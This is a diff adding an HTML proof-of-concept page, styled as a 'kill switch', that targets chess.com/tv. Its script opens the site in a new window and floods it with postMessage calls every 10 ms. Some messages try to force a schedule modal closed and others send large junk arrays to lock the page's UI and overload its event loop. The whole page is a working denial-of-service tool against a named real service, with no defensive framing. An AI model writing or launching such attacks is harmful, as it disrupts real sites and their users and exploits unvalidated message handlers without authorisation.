@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chess.com TV KILL SWITCH</title>
+    <style>
+        body { 
+            background-color: #000; 
+            color: #ff0000; 
+            font-family: 'Courier New', monospace; 
+            text-align: center; 
+            padding: 50px;
+        }
+        .container {
+            border: 2px solid #ff0000;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        h1 { font-size: 30px; margin-bottom: 10px; }
+        p { color: #fff; font-size: 14px; }
+        
+        button {
+            background: #ff0000;
+            color: #000;
+            border: none;
+            padding: 20px 40px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            text-transform: uppercase;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .status { margin-top: 20px; color: yellow; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>📺 TV INTERFACE DOS</h1>
+    <p>TARGET: Chess.com/tv (Legacy Bundles)</p>
+    <p>EFFECT: Perpetual UI Blocking & Event Loop Flood</p>
+    
+    <button onclick="launchDos()">☢️ EXECUTE DOS ATTACK</button>
+    
+    <div class="status" id="console">System Standby...</div>
+</div>
+
+<script>
+    function launchDos() {
+        const consoleLog = document.getElementById('console');
+        consoleLog.innerText = ">> OPENING TARGET...";
+        
+        // 1. Open the target
+        const target = window.open('https://www.chess.com/tv', '_blank');
+
+        // 2. Wait slightly for the window to initialize
+        setTimeout(() => {
+            consoleLog.innerText = ">> INITIATING EVENT FLOOD...";
+            
+            // 3. The Infinite Loop of Denial
+            // We use a very fast interval (10ms) to choke the receiver
+            setInterval(() => {
+                if(target.closed) return;
+
+                // Payload A: Force Close Schedule (Legacy & Modern keys)
+                const killKeys = [
+                    "close-schedule-modal", 
+                    "CLOSE_SCHEDULE_MODAL", 
+                    "tv-schedule-close",
+                    "closeModal"
+                ];
+
+                killKeys.forEach(key => {
+                    target.postMessage({ key: key }, '*');
+                });
+
+                // Payload B: Garbage Injection (To stress the JSON parser)
+                // Sending massive objects to lag the main thread
+                target.postMessage({ 
+                    event: "GARBAGE_COLLECTION_STRESS", 
+                    payload: new Array(1000).fill("LAG") 
+                }, '*');
+
+            }, 10); // 100 messages per second
+
+            consoleLog.innerText = ">> ATTACK RUNNING: UI LOCKED 🔒";
+            consoleLog.style.color = "#00ff00";
+            
+        }, 2000);
+    }
+</script>
+
+</body>
+</html>
+
